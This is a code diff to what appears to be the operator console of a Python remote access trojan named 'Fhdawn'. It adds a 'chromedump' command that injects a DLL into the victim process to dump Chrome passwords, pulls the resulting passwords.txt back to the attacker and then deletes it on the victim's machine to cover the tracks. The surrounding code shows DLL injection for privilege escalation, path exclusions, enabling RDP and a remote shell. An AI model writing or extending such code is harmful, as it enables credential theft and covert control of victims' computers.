@@ -251,7 +251,7 @@ class ClientManage:
         def DLLGetOutput():
             self.SendData("dlloutput")
             self.WaitForReply()
-
+    
         while(session):
             try:
                 try:
@@ -381,6 +381,10 @@ class ClientManage:
                         self.SendData("exclude")
                         self.SendData(path)
                         
+
+                elif ( main == "systeminfo"):
+                    self.SendData("systeminfo")
+                    self.WaitForReply()
 
                 elif ( main == "rdp_enable"):
                     
@@ -656,7 +660,14 @@ Open Ports
                     DLLTransfer("payloads/elevate.dll", "Fhdawn.exe") # Inject elevate.dll in Fhdawn.exe
                     print( Style.BRIGHT + Fore.CYAN + "[ + ] Payload Output : \n------------------\n" + Style.RESET_ALL)
                     DLLGetOutput()
-
+                
+                elif(main == "chromedump"):
+                    print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
+                    DLLTransfer("payloads/ChromeDump.dll", "Fhdawn.exe") # Inject ChromeDump.dll in Fhdawn.exe
+                    self.SendData("fupload:passwords.txt")
+                    time.sleep(2)
+                    self.SendData("delete:passwords.txt")
+                    self.WaitForReply()
             except KeyboardInterrupt:
                 print("[X] Interrupt, Type exit to Exit session.")
 
@@ -794,7 +805,18 @@ Open Ports
                         # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                         print("[i] Please report this bug to developer with the information above.")
                         pass
+                            
+                elif(client_data.startswith("DEL_OK")):
+                    try:
+                        fileinfo = client_data.split(",")
+                        print( "[" + Fore.LIGHTGREEN_EX + Style.BRIGHT + "i" + Style.RESET_ALL + "] File '{file}' deleted from '{pth}' ..." .format(file = fileinfo[1], pth = fileinfo[2] ))
 
+                    except Exception as Error:
+                        print("[X] Error : " + str(Error))
+                        print("[i] Reflective DLL Inject Information : " + client_data)
+                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
+                        print("[i] Please report this bug to developer with the information above.")
+                        pass
                 elif(shellmode == True):
                     print("\n"+client_data) # No other information
 
